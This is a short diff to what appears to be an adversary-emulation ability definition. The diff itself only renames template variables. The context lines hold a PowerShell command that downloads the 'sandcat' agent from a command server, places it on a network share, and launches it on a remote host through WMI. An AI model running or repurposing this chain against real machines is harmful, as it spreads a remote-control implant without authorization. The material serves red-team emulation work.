@@ -10,7 +10,7 @@
       psh:
         command: |
           $server="#{server}";
-          $sharePath="#{share}";
+          $sharePath="#{host.share}";
           Set-Location $sharePath;$url="$($server)/file/download";
           $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");
           $wc.Headers.add("file","sandcat.go");($data=$wc.DownloadData($url)) -and
@@ -19,7 +19,7 @@
           $startServer="$($sharePath)$name.exe -server $($server) ";Invoke-Command
           -ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod
           -Class Win32_Process -Name Create -ArgumentList "$($sharePath)$name.exe
-          -server $server -v" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server
+          -server $server -v" } -ComputerName #{host.name} -ArgumentList $startServer, $sharePath, $name, $server
         cleanup: del sandcat.go-windows; Invoke-Command -ComputerName
         payloads:
         - sandcat.go-windows
